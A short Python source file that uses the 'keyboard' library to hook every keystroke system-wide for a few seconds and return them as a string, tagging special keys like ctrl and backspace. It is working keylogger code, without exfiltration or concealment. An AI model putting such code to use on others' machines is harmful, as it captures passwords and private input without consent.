import datetime
import keyboard
from keyboard import KeyboardEvent
import time
import threading

spec_key = {
    key: f'⌠{key}⌡'
    for key in [
        'ctrl', 'shift', 'tab',
        'esc', 'left windows', 'print screen',
        'end', 'delete', 'f9',
        'insert', 'down', 'page down',
        'right', 'clear', 'left',
        'home', 'up', 'num lock',
        'backspace', 'enter', 'right shift',
        'page up', 'space', 'alt',
        'caps lock', 'right alt', 'right ctrl',
    ]
}

spec_key['space'] = ' '

def parse_key_event(event: KeyboardEvent):
    if event.event_type == keyboard.KEY_UP:
        return ""
    
    res = str(event.name)
    
    global spec_key    
    
    if res in spec_key:
        res = spec_key[res]
    
    return res

def get_key_log(duration = 5):
    logger = []
    
    keyboard.hook(
        lambda event: logger.append(parse_key_event(event))
    )
    
    time.sleep(duration)
    keyboard.unhook_all()

    return ''.join(logger)